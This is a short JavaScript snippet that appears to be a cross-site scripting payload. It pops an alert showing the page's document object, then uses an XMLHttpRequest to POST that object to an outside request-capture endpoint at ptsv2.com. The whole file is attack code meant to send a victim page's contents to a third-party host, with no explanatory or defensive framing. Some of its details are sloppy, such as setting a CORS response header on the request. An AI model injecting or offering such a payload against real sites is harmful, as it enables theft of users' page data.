
alert(document);
var xhr = new XMLHttpRequest();
xhr.open("POST", 'https://ptsv2.com/t/fyrw2-1641653611/post', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.setRequestHeader('Access-Control-Allow-Origin', 'https://ptsv2.com');
xhr.send(document);
